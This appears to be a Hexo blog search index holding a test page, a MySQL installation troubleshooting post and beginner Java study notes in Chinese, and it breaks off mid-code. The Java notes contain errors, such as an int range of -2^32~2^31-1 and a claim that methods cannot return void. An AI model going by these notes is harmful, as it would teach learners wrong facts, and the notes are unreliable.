<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/posts/textsss/"/>
      <url>/posts/textsss/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">A</mi><mi mathvariant="normal">B</mi></mrow><annotation encoding="application/x-tex">\Alpha\Beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">A</span></span><span class="mord"><span class="mord mathrm">B</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>9</mn><mo separator="true">,</mo><mn>16</mn><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">a_n = \{1, 4, 9, 16, \cdots\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mclose">}</span></span></span></span></span></p><h1><a><center>测试</center></a></h1><h2><a><center>测试</center></a></h2><h3><a><center>测试</center></a></h3><h4><a><center>测试</center></a></h4><h5><a><center>测试</center></a></h5><h6><a><center>测试</center></a></h6><div class="note primary">            <p>初级标签</p></div><div class="note success"><p> Codeblock in note<br>成功标签</p></div><div class="note info">            <p> Info Header<br>信息标签</p></div><div class="note warning">            <p> Warning Header<br>警告标签</p>          </div><div class="note danger">            <p> Danger Header<br>危险标签</p>          </div><div class="note info no-icon">            <p>note info no-icon<br>无图标标签</p>          </div> <img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.1/img/avatar.jpg" align="" height="200px" width="200px"><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.1/img/avatar.jpg" align="middle" height="200px" width="200px"><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.1/img/avatar.jpg" align="right" height="200px" width="200px"><p>测试表格</p><table><thead><tr><th style="text-align:left"><strong>第一组</strong></th><th style="text-align:center"><strong>第二组</strong></th><th style="text-align:center"><strong>第三组</strong></th></tr></thead><tbody><tr><td style="text-align:left">共40人</td><td style="text-align:center">共40人</td><td style="text-align:center">共40人</td></tr><tr><td style="text-align:left">男生15人</td><td style="text-align:center">男生15人</td><td style="text-align:center">男生15人</td></tr></tbody></table><p>●</p><p>●</p><p>●</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
            <tag> TTTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL安装过程出现的问题—解决方法</title>
      <link href="/posts/mysql-error/"/>
      <url>/posts/mysql-error/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>近期要学习MySQL数据库，今天就想着安装一下吧，找了一个教程跟着安装了，结果没想到，出现很多错误，不过看网上大佬们的解决方法后都一一解决了。</p><h1 id="starting-the-server"><a class="markdownIt-Anchor" href="#starting-the-server"></a> Starting the server</h1><p>出现下图问题：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@master/images/MySQL_error1.jpg" alt=""></p><p>点击Log，查看：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@master/images/MySQL_error2.jpg" alt=""></p><p>解决方法：</p><p><strong>1、点击win+r</strong></p><p><strong>2、输入services.msc</strong></p><p><strong>3、找到服务项，右键选择属性</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@master/images/MySQL_error3.jpg" alt=""></p><p><strong>4、选择属性里面的登录，选择本地系统账户</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@master/images/MySQL_error4.jpg" alt=""></p><p><strong>5、应用，确定</strong></p><p>进行完这5步就可以了</p><p>参考文章：<a href="https://blog.csdn.net/u014776759/article/details/88422967" target="_blank" rel="noopener">mysql安装时，Unable to connect to any of the specified MySQL hosts</a></p><h1 id="mysql输入密码后闪退"><a class="markdownIt-Anchor" href="#mysql输入密码后闪退"></a> MySQL输入密码后闪退</h1><p>这个问题我找了几篇博客看了看，只有一个我成功了，其他的可能其他原因没有成功吧=_=</p><p>解决方法：</p><p><strong>不输入密码直接回车…</strong></p><p>但是这种方法总感觉不妥当，目前倒是可以解决</p><p>参考文章：</p><p><a href="https://blog.csdn.net/Marksinoberg/article/details/51239931?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param" target="_blank" rel="noopener">MySQL输入密码后闪退，这里有解</a></p><p><a href="https://blog.csdn.net/deng214/article/details/80400579" target="_blank" rel="noopener">详述 MySQL 数据库输入密码后闪退的问题及解决方案</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习历程重难点总结</title>
      <link href="/posts/java/"/>
      <url>/posts/java/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>学习了Java一周了，发现东西越来越复杂，好脑子不如记录下来，比你翻书方便许多；</p><h1 id="从helloworld开始"><a class="markdownIt-Anchor" href="#从helloworld开始"></a> 从HelloWorld开始</h1><p>先来一段Java的Hello World：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h1><h2 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h2><p>Java中注释有两种方法：</p><p>第一种，单行注释，双斜杠，//</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="comment">//System.out.println("Hello World");</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>第二种，多行注释，/*…*/</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="comment">/*System.out.println("Hello World");</span></span><br><span class="line"><span class="comment">        System.out.println("Hello World");*/</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="关键字"><a class="markdownIt-Anchor" href="#关键字"></a> 关键字</h2><p>Java中关键字有50个左右，以下列举：（来源：<a href="https://baike.baidu.com/item/java%E5%85%B3%E9%94%AE%E5%AD%97" target="_blank" rel="noopener">Java关键字</a>）</p><blockquote><p>关键字的字母全部小写</p></blockquote><table><thead><tr><th style="text-align:left"><strong>关键字</strong></th><th style="text-align:left"><strong>含义</strong></th></tr></thead><tbody><tr><td style="text-align:left"><strong>abstract</strong></td><td style="text-align:left"><strong>表明类或者成员方法具有抽象属性</strong></td></tr><tr><td style="text-align:left"><strong>assert</strong></td><td style="text-align:left"><strong>断言，用来进行程序调试</strong></td></tr><tr><td style="text-align:left"><strong>boolean</strong></td><td style="text-align:left"><strong>基本数据类型之一，声明布尔类型的关键字</strong></td></tr><tr><td style="text-align:left"><strong>break</strong></td><td style="text-align:left"><strong>提前跳出一个块</strong></td></tr><tr><td style="text-align:left"><strong>byte</strong></td><td style="text-align:left"><strong>基本数据类型之一，字节类型</strong></td></tr><tr><td style="text-align:left"><strong>case</strong></td><td style="text-align:left"><strong>用在switch语句之中，表示其中的一个分支</strong></td></tr><tr><td style="text-align:left"><strong>catch</strong></td><td style="text-align:left"><strong>用在异常处理中，用来捕捉异常</strong></td></tr><tr><td style="text-align:left"><strong>char</strong></td><td style="text-align:left"><strong>基本数据类型之一，字符类型</strong></td></tr><tr><td style="text-align:left"><strong>class</strong></td><td style="text-align:left"><strong>声明一个类</strong></td></tr><tr><td style="text-align:left"><strong>const</strong></td><td style="text-align:left"><strong>保留关键字，没有具体含义</strong></td></tr><tr><td style="text-align:left"><strong>continue</strong></td><td style="text-align:left"><strong>回到一个块的开始处</strong></td></tr><tr><td style="text-align:left"><strong>default</strong></td><td style="text-align:left"><strong>默认，例如，用在switch语句中，表明一个默认的分支。Java8 中也作用于声明接口函数的默认实现</strong></td></tr><tr><td style="text-align:left"><strong>do</strong></td><td style="text-align:left"><strong>用在do-while循环结构中</strong></td></tr><tr><td style="text-align:left"><strong>double</strong></td><td style="text-align:left"><strong>基本数据类型之一，双精度浮点数类型</strong></td></tr><tr><td style="text-align:left"><strong>else</strong></td><td style="text-align:left"><strong>用在条件语句中，表明当条件不成立时的分支</strong></td></tr><tr><td style="text-align:left"><strong>enum</strong></td><td style="text-align:left"><strong>枚举</strong></td></tr><tr><td style="text-align:left"><strong>extends</strong></td><td style="text-align:left"><strong>表明一个类型是另一个类型的子类型。对于类，可以是另一个类或者抽象类；对于接口，可以是另一个接口</strong></td></tr><tr><td style="text-align:left"><strong>final</strong></td><td style="text-align:left"><strong>用来说明最终属性，表明一个类不能派生出子类，或者成员方法不能被覆盖，或者成员域的值不能被改变，用来定义常量</strong></td></tr><tr><td style="text-align:left"><strong>finally</strong></td><td style="text-align:left"><strong>用于处理异常情况，用来声明一个基本肯定会被执行到的语句块</strong></td></tr><tr><td style="text-align:left"><strong>float</strong></td><td style="text-align:left"><strong>基本数据类型之一，单精度浮点数类型</strong></td></tr><tr><td style="text-align:left"><strong>for</strong></td><td style="text-align:left"><strong>一种循环结构的引导词</strong></td></tr><tr><td style="text-align:left"><strong>goto</strong></td><td style="text-align:left"><strong>保留关键字，没有具体含义</strong></td></tr><tr><td style="text-align:left"><strong>if</strong></td><td style="text-align:left"><strong>条件语句的引导词</strong></td></tr><tr><td style="text-align:left"><strong>implements</strong></td><td style="text-align:left"><strong>表明一个类实现了给定的接口</strong></td></tr><tr><td style="text-align:left"><strong>import</strong></td><td style="text-align:left"><strong>表明要访问指定的类或包</strong></td></tr><tr><td style="text-align:left"><strong>instanceof</strong></td><td style="text-align:left"><strong>用来测试一个对象是否是指定类型的实例对象</strong></td></tr><tr><td style="text-align:left"><strong>int</strong></td><td style="text-align:left"><strong>基本数据类型之一，整数类型</strong></td></tr><tr><td style="text-align:left"><strong>interface</strong></td><td style="text-align:left"><strong>接口</strong></td></tr><tr><td style="text-align:left"><strong>long</strong></td><td style="text-align:left"><strong>基本数据类型之一，长整数类型</strong></td></tr><tr><td style="text-align:left"><strong>native</strong></td><td style="text-align:left"><strong>用来声明一个方法是由与计算机相关的语言（如C/C++/FORTRAN语言）实现的</strong></td></tr><tr><td style="text-align:left"><strong>new</strong></td><td style="text-align:left"><strong>用来创建新实例对象</strong></td></tr><tr><td style="text-align:left"><strong>package</strong></td><td style="text-align:left"><strong>包</strong></td></tr><tr><td style="text-align:left"><strong>private</strong></td><td style="text-align:left"><strong>一种访问控制方式：私用模式</strong></td></tr><tr><td style="text-align:left"><strong>protected</strong></td><td style="text-align:left"><strong>一种访问控制方式：保护模式</strong></td></tr><tr><td style="text-align:left"><strong>public</strong></td><td style="text-align:left"><strong>一种访问控制方式：共用模式</strong></td></tr><tr><td style="text-align:left"><strong>return</strong></td><td style="text-align:left"><strong>从成员方法中返回数据</strong></td></tr><tr><td style="text-align:left"><strong>short</strong></td><td style="text-align:left"><strong>基本数据类型之一,短整数类型</strong></td></tr><tr><td style="text-align:left"><strong>static</strong></td><td style="text-align:left"><strong>表明具有静态属性</strong></td></tr><tr><td style="text-align:left"><strong>strictfp</strong></td><td style="text-align:left"><strong>用来声明FP_strict（单精度或双精度浮点数）</strong></td></tr><tr><td style="text-align:left"><strong>super</strong></td><td style="text-align:left"><strong>表明当前对象的父类型的引用或者父类型的构造方法</strong></td></tr><tr><td style="text-align:left"><strong>switch</strong></td><td style="text-align:left"><strong>分支语句结构的引导词</strong></td></tr><tr><td style="text-align:left"><strong>synchronized</strong></td><td style="text-align:left"><strong>表明一段代码需要同步执行</strong></td></tr><tr><td style="text-align:left"><strong>this</strong></td><td style="text-align:left"><strong>指向当前实例对象的引用</strong></td></tr><tr><td style="text-align:left"><strong>throw</strong></td><td style="text-align:left"><strong>抛出一个异常</strong></td></tr><tr><td style="text-align:left"><strong>throws</strong></td><td style="text-align:left"><strong>声明在当前定义的成员方法中所有需要抛出的异常</strong></td></tr><tr><td style="text-align:left"><strong>transient</strong></td><td style="text-align:left"><strong>声明不用序列化的成员域</strong></td></tr><tr><td style="text-align:left"><strong>try</strong></td><td style="text-align:left"><strong>尝试一个可能抛出异常的程序块</strong></td></tr><tr><td style="text-align:left"><strong>void</strong></td><td style="text-align:left"><strong>声明当前成员方法没有返回值</strong></td></tr><tr><td style="text-align:left"><strong>volatile</strong></td><td style="text-align:left"><strong>表明两个或者多个变量必须同步地发生变化</strong></td></tr><tr><td style="text-align:left"><strong>while</strong></td><td style="text-align:left"><strong>用在循环结构中</strong></td></tr></tbody></table><h2 id="常量"><a class="markdownIt-Anchor" href="#常量"></a> 常量</h2><table><thead><tr><th><strong>常量类型</strong></th><th><strong>举例</strong></th></tr></thead><tbody><tr><td><strong>字符串常量</strong></td><td><strong>"Hello World"…</strong></td></tr><tr><td><strong>整数常量</strong></td><td><strong>1，2，-3…</strong></td></tr><tr><td><strong>小数常量</strong></td><td><strong>1.23，-2.34…</strong></td></tr><tr><td><strong>字符常量</strong></td><td><strong>’A’，‘b’，‘0’…</strong></td></tr><tr><td><strong>布尔常量</strong></td><td><strong>true，false</strong></td></tr><tr><td><strong>空常量</strong></td><td><strong>null</strong></td></tr></tbody></table><h2 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h2><table><thead><tr><th><strong>数据类型</strong></th><th><strong>关键字</strong></th><th><strong>内存占用</strong></th><th><strong>取值范围</strong></th></tr></thead><tbody><tr><td><strong>整型</strong></td><td><strong>byte</strong></td><td><strong>1</strong></td><td><strong>-128~127</strong></td></tr><tr><td><strong>整型</strong></td><td><strong>short</strong></td><td><strong>2</strong></td><td><strong>-32768~32767</strong></td></tr><tr><td><strong>整型</strong></td><td><strong>int</strong></td><td><strong>4</strong></td><td><strong>-2^32~2^31-1</strong></td></tr><tr><td><strong>整型</strong></td><td><strong>long</strong></td><td><strong>8</strong></td><td><strong>-2^63~2^63-1</strong></td></tr><tr><td><strong>浮点型</strong></td><td><strong>float</strong></td><td><strong>4</strong></td><td><strong>负数：-3.403E+38~-1.401E-45；正数：1.401E-45~3.403E+38</strong></td></tr><tr><td><strong>浮点型</strong></td><td><strong>double</strong></td><td><strong>8</strong></td><td><strong>负数：-1.798E+308~-4.90E-324；正数：4.90E-324~1.798E+308</strong></td></tr><tr><td><strong>字符型</strong></td><td><strong>char</strong></td><td><strong>2</strong></td><td><strong>0~65535</strong></td></tr><tr><td><strong>布尔型</strong></td><td><strong>boolean</strong></td><td><strong>1</strong></td><td><strong>true，false</strong></td></tr></tbody></table><blockquote><p>需要注意的是，Java中的整数默认是int型，浮点数默认是double型，当使用long数据类型时，数据结尾要加一个L，不然会当成int型处理，可能发生报错等情况，比如：long n=100000000000000L；当使用float数据类型时，结尾加F，后面同理。</p></blockquote><h2 id="标识符"><a class="markdownIt-Anchor" href="#标识符"></a> 标识符</h2><p><strong>● 由数字、字母、下划线和美元符($)组成</strong></p><p><strong>● 不能以数字开头</strong></p><p><strong>● 不能是关键字</strong></p><p><strong>● 区分大小写</strong></p><h2 id="类型转换"><a class="markdownIt-Anchor" href="#类型转换"></a> 类型转换</h2><h3 id="自动类型转换"><a class="markdownIt-Anchor" href="#自动类型转换"></a> 自动类型转换</h3><p>把一个表示数据范围小的数值或者变量赋给另一个表示范围大的变量：</p><blockquote><p>byte -&gt; short -&gt; int -&gt; long -&gt; float -&gt; double</p></blockquote><h3 id="强制类型转换"><a class="markdownIt-Anchor" href="#强制类型转换"></a> 强制类型转换</h3><p>把一个表示数据范围大的数值或者变量赋给另一个表示范围小的变量：</p><p>或者就是任何变量间的互相转换都可以使用强转；</p><p>格式：变量名 = （目标数据类型）值或者变量</p><h2 id="运算符"><a class="markdownIt-Anchor" href="#运算符"></a> 运算符</h2><h3 id="赋值运算符"><a class="markdownIt-Anchor" href="#赋值运算符"></a> 赋值运算符</h3><p>n = 10;</p><h3 id="自增减运算符"><a class="markdownIt-Anchor" href="#自增减运算符"></a> 自增减运算符</h3><p>n ++; n–; ++n; --n</p><h3 id="关系运算符"><a class="markdownIt-Anchor" href="#关系运算符"></a> 关系运算符</h3><p>==; !=; &gt;; &gt;=; &lt;; &lt;=</p><h3 id="逻辑运算符"><a class="markdownIt-Anchor" href="#逻辑运算符"></a> 逻辑运算符</h3><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>&amp;</td><td>逻辑与</td></tr><tr><td>|</td><td>逻辑或</td></tr><tr><td>^</td><td>逻辑异或</td></tr><tr><td>!</td><td>逻辑非</td></tr></tbody></table><h3 id="短路逻辑运算符"><a class="markdownIt-Anchor" href="#短路逻辑运算符"></a> 短路逻辑运算符</h3><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>短路与</td></tr><tr><td>||</td><td>短路或</td></tr></tbody></table><h3 id="三元运算符"><a class="markdownIt-Anchor" href="#三元运算符"></a> 三元运算符</h3><p>格式：关系表达式？表达式1：表示式2</p><p>规则：首先计算关系表达式，值为true，表示1的值就是运算结果，值为false，表示2的值就是运算结果。</p><h1 id="数据输入与输出"><a class="markdownIt-Anchor" href="#数据输入与输出"></a> 数据输入与输出</h1><h2 id="输入"><a class="markdownIt-Anchor" href="#输入"></a> 输入</h2><p>数据输入方法分为3个步骤：</p><p>1、导包（必须在定义类的上方）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br></pre></td></tr></tbody></table></figure><p>2、创建对象（sc可以变，其他固定）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br></pre></td></tr></tbody></table></figure><p>3、接收数据（若n为int型，后面则是nextIn(),若为double型，后面则是nextDouble()，以此类推）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = sc.nextInt()</span><br></pre></td></tr></tbody></table></figure><h2 id="输出"><a class="markdownIt-Anchor" href="#输出"></a> 输出</h2><p>输出语句：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(...);</span><br><span class="line">System.out.println(...);</span><br></pre></td></tr></tbody></table></figure><p>第一种为输出后不换行，第二种为输出后换行</p><p>单独输出换行的方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(...);</span><br><span class="line">System.out.print(<span class="string">"...\n"</span>);</span><br></pre></td></tr></tbody></table></figure><p>输出可以拼接，例如：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="number">1</span>+<span class="number">2</span>);  </span><br><span class="line">System.out.println(<span class="number">1</span>+<span class="number">1.2</span>);</span><br><span class="line">System.out.println(<span class="number">1</span>+<span class="string">'a'</span>+<span class="number">2</span>);</span><br><span class="line">System.out.println(<span class="number">1</span>+<span class="string">"a"</span>+<span class="number">2</span>);</span><br><span class="line">System.out.println(<span class="string">"Hello "</span>+<span class="string">"World "</span>+<span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>);</span><br></pre></td></tr></tbody></table></figure><p>这4条语句分别输出：<u>3</u>  <u>2.2</u>  <u>100</u>   <u>1a2</u>   <u>Hello World 123</u></p><blockquote><p>这里用到了算术运算符中的’+'操作：算术表达式中包含多个基本数据类型的值得时候，整个表达式的类型会自动提升到最高等级的类型，等级顺序：byte，short，char -&gt; int -&gt; long -&gt; float -&gt; double；如果出现字符串，则进行字符串连接，然后从左到右进行，如果开始没有出现字符串，则首先进行算术加运算。</p></blockquote><h1 id="顺序结构"><a class="markdownIt-Anchor" href="#顺序结构"></a> 顺序结构</h1><p>顺序结构包括：if结构，switch结构，for结构，while结构，do while结构</p><p>if结构和switch结构为分支结构</p><p>for结构，while结构和do while结构为循环结构</p><blockquote><p>顺序结构和C语言几乎一模一样，不整理了</p></blockquote><h1 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h1><h2 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h2><p>数组定义有2种方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据类型 数组名[] = new 数据类型[number];</span></span><br><span class="line"><span class="comment">//数据类型[] 数组名 = new 数据类型[number];</span></span><br></pre></td></tr></tbody></table></figure><p>例如：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[number];  </span><br><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[number];</span><br></pre></td></tr></tbody></table></figure><h2 id="初始化"><a class="markdownIt-Anchor" href="#初始化"></a> 初始化</h2><p>数组初始化有2方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据类型[] 变量名 = new 数据类型[]{数据1，数据2，数据3...};</span></span><br><span class="line"><span class="comment">//数据类型[] 变量名 = {数据1，数据2，数据3...};</span></span><br></pre></td></tr></tbody></table></figure><p>例如：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]{<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>};</span><br><span class="line"><span class="keyword">int</span>[] arr = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>}</span><br></pre></td></tr></tbody></table></figure><h2 id="遍历"><a class="markdownIt-Anchor" href="#遍历"></a> 遍历</h2><p>遍历数组要用循环结构，for循环最为方便：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++){</span><br><span class="line">    System.out.println(arr[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>arr.length返回的是数组长度</p></blockquote><h1 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h1><p>Java中的方法跟函数类似，自己感觉一模一样，仅仅是名称不同；</p><p>基本格式：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> 数据类型 方法名(参数){</span><br><span class="line">    方法体</span><br><span class="line">    <span class="keyword">return</span> 数据;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>数据类型不可以是void，参数可以是一个，可以是多个</p><h2 id="无返回值"><a class="markdownIt-Anchor" href="#无返回值"></a> 无返回值</h2><p>这种方法没有返回值，看个例子：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        HelloWorld();</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">()</span></span>{</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种无返回值的是直接输出了语句；</p><h2 id="有返回值"><a class="markdownIt-Anchor" href="#有返回值"></a> 有返回值</h2><p>这种方法是有返回值类型，看个例子：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        System.out.println(HelloWorld(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">HelloWorld</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span></span>{</span><br><span class="line">        <span class="keyword">return</span> m+n;</span><br><span class="line">    }</span><br><span 